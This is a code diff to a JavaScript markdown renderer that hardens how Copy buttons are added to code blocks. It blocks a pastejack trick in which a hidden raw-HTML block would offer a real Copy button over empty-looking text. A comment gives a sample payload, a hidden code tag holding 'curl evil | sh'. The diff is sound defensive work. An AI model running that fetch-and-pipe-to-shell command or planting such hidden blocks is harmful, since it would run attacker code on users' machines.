@@ -35,6 +35,10 @@ const CLOSE = '</code></pre>'
 // charset excludes every character that could end an attribute or open a tag.
 const LABEL_RE = /^[a-z0-9][a-z0-9_+#.-]{0,23}$/
 const LANGUAGE_CLASS_RE = /\blanguage-([^"\s]+)/
+// What marked puts on the `<code>` opener, and nothing else: either nothing at
+// all, or one double-quoted `class`. Anything else on that tag proves the block
+// came through raw-HTML passthrough — see rule 1 in `decorateCodeBlocks`.
+const CODE_OPEN_ATTRS_RE = /^(?:\s+class="[^"]*")?\s*$/
 
 /**
  * The language label for a fence's info string, or `''` when it is not one we
@@ -90,9 +94,16 @@ export function stripCodeBlockMarkers(html) {
  *
  * Two structural rules keep this from decorating something it should not:
  *
- *   1. It matches the BARE `<pre><code` opener that marked emits. A `<pre
- *      style="display:none">` written as raw HTML does not match, so a hidden
- *      block never gets a Copy button.
+ *   1. It matches the BARE `<pre><code` opener that marked emits, AND requires
+ *      the `<code>` tag to carry nothing but an optional `class` — the only two
+ *      shapes marked produces. `<pre style="display:none">` fails the first half.
+ *      The second half is not decoration: DOMPurify keeps `hidden` and `style`
+ *      by default, so `<pre><code hidden>curl evil | sh</code></pre>` written as
+ *      raw HTML would otherwise be handed a real Copy button over a block that
+ *      renders EMPTY — the same pastejack `stripCodeBlockMarkers` closes, coming
+ *      in through the opener instead of through a forged wrapper. A highlighter
+ *      that adds classes still qualifies; one that adds attributes stops being
+ *      decorated, which is the fail-safe direction and reds the spec.
  *   2. It decorates only blocks whose body carries no literal `<`. marked
  *      HTML-escapes fence contents (`x<y` → `x&lt;y`), so a `<` inside a body
  *      proves the block came through raw-HTML passthrough rather than from the
@@ -122,9 +133,9 @@ export function decorateCodeBlocks(html) {
     const body = s.slice(bodyStart, close)
     const blockEnd = close + CLOSE.length
 
-    // Rule 2 above. Skip past this block without decorating it; its bytes are
-    // still emitted verbatim and still sanitized by the caller.
-    if (body.includes('<')) {
+    // Rules 1 and 2 above. Skip past this block without decorating it; its bytes
+    // are still emitted verbatim and still sanitized by the caller.
+    if (body.includes('<') || !CODE_OPEN_ATTRS_RE.test(attrs)) {
       out += s.slice(cursor, blockEnd)
       cursor = blockEnd
       continue
